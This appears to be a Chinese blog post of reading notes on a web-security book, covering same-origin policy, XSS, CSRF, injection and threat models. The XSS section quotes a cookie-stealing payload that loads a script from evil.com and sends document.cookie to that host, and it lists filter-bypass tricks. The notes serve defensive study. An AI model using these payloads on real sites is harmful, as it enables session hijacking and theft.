---
layout : post
title : 《白帽子讲Web安全》读书笔记
categories : 渗透
tags : 安全 Web 渗透
---
!TOC

#第零篇 总览

## 客户端脚本安全 
1.浏览器安全 

同源策略（Same Origin Policy）防止了跨域读写某些资源。 
浏览器提供了浏览器沙箱，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。 

2.跨站脚本攻击 

跨站脚本攻击主要是注入到网站内容中，授权用户访问内容时执行一段恶意代码，从而获取用户的私密信息或者进行破坏。通常叫做XSS攻击，是针对动态网站的攻击。 

3.跨站点请求伪造 

CSRF，指的是伪造出一个请求，诱使授权用户访问，以授权用户的身份去执行请求，从而达到对授权用户信息的读取、攻击等。 

4.点击劫持 
Click jacking，是指将恶意代码隐藏在看似无害的内容后者按钮之下，诱导用户访问的一种手段。 

5.Html5安全

1）HTML引入了很多新的标签，一些XSS Filter可能并没有覆盖这些新增的标签和功能。比如video、audio、iframe的sandbox。此外使用canvas可以在浏览器环境中实现对验证码的在线破解，大大降低了攻击的门槛。

2）跨域请求的Orgin Header和Access-Control-Allow-Origin的设置。postMessage的引入，使XSS PayLoad变得更加的灵活。

##服务端安全 
1.注入攻击 

注入攻击是一种普遍的利用数据库SQL语句进行攻击的方式。使用用户提交的数据拼接数据库操作字符串，如果这些字符串中包含一些特殊字符就有可能查询到数据库关键信息。 

2.文件上传漏洞 

通常的一个问题就是对上传文件的格式控制不严格，并且文件存放的路径可以通过Web路径直接进行访问；另一种方式，就是文件路径是通过表单的方式提交的，可以使用一个特殊字符“\0”截断文件路径，从而实现对脚本文件的上传。 

3.认证与会话管理 

用户的登录状态一般是进过认证之后保存在服务端的，与服务器端的一系列交互即会话。一般对会话的管理。。。

4.访问控制 

对于系统中不同的用户具有不同的权限，对这些权限进行控制即访问控制。如果访问控制不严就容易形成漏洞被利用。 

5.加密算法与随机数 

系统中对数据进行加密使用的加密算法和随机数生成算法的安全性和健壮性都直接关系到整个系统的安全性。对称加密、非对称加密的密钥的安全性，随机数算法的随机性都是要考虑的问题。

6.Web框架安全
一些经典的使用率较高的Web框架如：Spring、Struts、Hibernate本身会在整个执行体系中有一些安全漏洞。比如前一阵的Struts2的命令执行漏洞，就是因为在OGNL中可以执行JAVA静态方法造成的。 

7.应用层拒绝服务攻击 

DOS，这种攻击是以耗尽服务器资源为目的攻击。DDOS分布式 拒绝服务攻击，是DOS的加强版。防范拒绝服务攻击要从访问入口处进行，限制来自统一IP的访问频率或者就是最大化提升系统的负载能力。 

8.PHP安全和Web服务器配置安全 

针对与PHP本身的一些API的特点，可以在代码层面进行安全控制。比如，对数据库SQL相关的操作，要对用户输入的参数进行mysql_real_esape等。此外，对于Web Server如Apache http server，对其magic_quote,GLOBAL等配置要权衡关闭和开启是否会对系统的安全造成威胁。


#第一篇 世界安全观
---
##第1章 作者吹逼

1.安全三要素是安全的基本组成元素，分别是**机密性**（Confidentiality）、**完整性**（Integrity）、**可用性**（Availability）。

* **机密性**要求被保护的数据不能泄露，加密是实现机密性要求的常见手段。
* **完整性**则要求保护数据内容是完整、没有被篡改的。常见的保证手段是数字签名。
* **可用性**要求保护资源是“随需而得”。Dos就破坏了这个规则。

2.互联网的安全的**核心问题**，是**数据安全**的问题。

3.微软提出了一种威胁建模方法，叫做STRIDE模型。

威胁 | 定义 | 对应的安全属性
:----------- | :-----------  | :-----------
Spoofing（伪装）| 冒充他人身份 | 认证 
Tampering（篡改）| 修改数据或代码 | 完整性 
Repudiation（抵赖）| 否认做的的事情 | 不可抵赖性 
Information Disclosure（信息泄露）| 机密信息泄露 | 机密性 
Denial of Service（拒绝服务）| 拒绝服务 | 可用性 
Elevation of Privilege（提升权限）| 未经授权获得许可 | 授权 

4.同时，微软还提出了一个风险衡量模型DREAD。

等级 | 高（3） | 中（2） | 低（1）
:- | :- | :-
Damage Potential | 获得完全验证权限；执行管理员操作；非法上传文件 | 泄露敏感信息 | 泄露其他信息
Reproductibility | 攻击者可以随意再次攻击 | 攻击者可以重复攻击，但是有限制 | 攻击者很难重复攻击过程
Exploitability | 	初学者在短期内可以掌握攻击方法 | 熟练的攻击者才能完成这次攻击 | 泄露利用条件非常苛刻
Affected users| 所有用户，默认配置，关键用户 | 部分用户，非默认配置 | 极少用用户，匿名用户
Discoverability | 漏洞很显眼，攻击条件很容易获得 | 在私有区域，部分人能看到，需要深入挖掘漏洞 | 发现该漏洞及其空难

5.作者自己提出的白帽子法则--Secure By Default原则

* 黑名单、白名单原则
* 最小权责原则
* 纵深防御原则，指需要全面防御
* 数据和代码分离原则，指漏洞的成因
* 不可预测原则，指攻击方式的不可预测 

#第二篇 客户端脚本安全
---
##第2章 浏览器安全

1.同源策略（Same Origin Policy）是一种**约定**，它是浏览器最核心也是最基本的安全功能。**浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性**。影响源的因素：**host（域名或者IP地址），子域名，端口，协议**。

值得注意的是，对于当前页面来说，页面存放JavaScript文件的域并不重要，重要的是加载Javascript的页面所在的域是什么，通过这样一段代码描述。

```
 <script src=http://b.com/b.js></script>
```


这段代码是a.com页面上加载了b.com上的b.js，但是b.js是运行在a.com页面上的，因为对于当前打开的页面（a.com）来说，b.js的Origin就应该是a.com，而不是b.com。

2.XMLHttpRequest受到同源策略的约束，不能够跨域访问资源，在进行AJAX开发时要注意这有点。技术发中中，W3C委员会制定出了XMLHttpRequest跨域访问标准，通过目标域返回的HTTP头来授权是否允许跨域访问。

3.在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，就做**挂马**。

##第三章 跨站脚本攻击（Cross Site Script，XSS）

1.跨站脚本攻击，英文全称为Cross Site Script，与层叠样式表（Cascading Style Sheet，CSS）重复了，所以使用了XSS。XSS攻击，一般是指黑客通过各种方式篡改了网页，插入了恶意代码，用户在浏览网页时，控制用户浏览器的一种攻击。一开的时候，这种攻击的的演示案例是“跨域”的，所以叫做“跨站脚本”，现在，前端技术的发展使得跨域是否已经不重要，由于历史的原因，还是叫做XSS。

2.XSS根据效果分成三类：

 * 反射型XSS：只是简单的用户输入的数据**反射**给浏览器，也就是说，黑客往往需要诱使用户点击一个恶意连接，才可能攻击成功，反射型XSS也叫做**非持久型XSS**（Non-Persisent XSS）。
 * 存储型XSS：它会把用户输入的数据**存储**在服务器上，具有非常高的稳定性。一个常见场景，黑客写一篇含有恶意代码的博客，文章发表后，所有访问这篇文章的用户都会执行这些恶意代码。这类XSS也叫做**持久型XSS**（Persisent XSS）。
 * DOM Based XSS：这种XSS不是按照**数据是否保存在服务器上**区分的，按照原理，DOM Based XSS应该算是反射型XSS，但是它的形成比较特殊，安全专家专门提出了将它单独分为一类。
 
 3.一个简单的XSS Payload
 
 一个最常见的XSS Payload就是读取浏览器的Cookie对象，从而发起**Cookie劫持**攻击。攻击者首先加载一个远程脚本，这样可以有效的避免在URL的参数中写入大量的Javascript。
 
 ```
  http://www.a.com/test.html?abc="><script src=http://www.evil.com/evil.js></script>
 ```
 真正的攻击脚本写在这个远程脚本evil.js中。
 
 ```
  var img = document.createElement("img");
  img.src = "http://www.evil.com/log?" + escape(document.cookie);
  document.body.appendChild(img);
 ```
这段代码在页面中插入了一张不可见的图片，同时把cookie对象当做参数发向了攻击者的服务器。这样就构造了最简单的一个窃取cookie的XSS Payload。

4.构造Get和Post请求直接调取系统的功能。

5.XSS钓鱼。

6.识别用户浏览器。

7.识别用户安装的软件。

8.CSS History Hack，通过style的visited属性，因为如果用户访问过某个页面，那么这个连接的颜色会不一样。

9.获取用户的真实IP。

10.XSS攻击平台：Attack API，BeEF，XSS-Proxy，目前国内网上有不少在线攻击平台，可以自行百度使用。

11.XSS蠕虫，书中给出了MySpace.com和百度空间的XSS蠕虫例子。

12.调试JavaScript

 * Firebug，FireFox中超好用。
 * IE 8 Develper Tools，这个很老了，新版的IE都自带了JavaScript的调试器。
 * Fiddler，一个本地代理服务器，很好用，与之类似的还有Burp Suite。
 * HttpWatch，嵌入在浏览器中，能够监测所有浏览器请求。
 
13.XSS构造技巧

 * 利用字符编码，如Unicode组合字符，在百度搜索中“%c1\”就是一个Unicdoe字符，转义符号“\”被绕过了。
 * 绕过长度限制：
   * 利用时间（Event）来缩短需要的字节数。
   * 利用location.hash来访Payload，然后eval(location.hash)。因为location.hash也是有长度的，所有如果需要的Payload特别上，可以在loaction.hash里放入远程加载代码的Payload。
   * 在一些环境中，可以使用注释来绕过长度限制。
 * 使用<base>标签，它的作用是定义页面上的所有使用相对路径标签的host地址。如一张地址为 http://www.google.com/a/b/c/d/e.png 的图片用下面的代码使用。<base>标签可以使用在页面的任何地方，并作用于该标签之后的所有标签。如果攻击者控制了这个标签，就可以在远程服务器上控制图片、连接和脚本，所以这是一个非常危险的标签，如果要做安全方案，必须得过滤这个标签。
 
```
<body>
<base  href="http://www.google.com"/>
<img src="a/b/c/d/e.png">
</body>
```
 * window.name的妙用：对当前窗口的window.name对象赋值，没有特殊字符的限制。因为window对象是浏览器窗体，而不是document对象，并且很多时候window对象不受同源策略的限制。如当www.a.com一个页面test.html上修改了window.name的值后，页面跳转到www.b.com站点的一个页面test.html，会发现window.name的值并没有改变。利用这一点，就可以实现跨域攻击。


 


#参考文献
---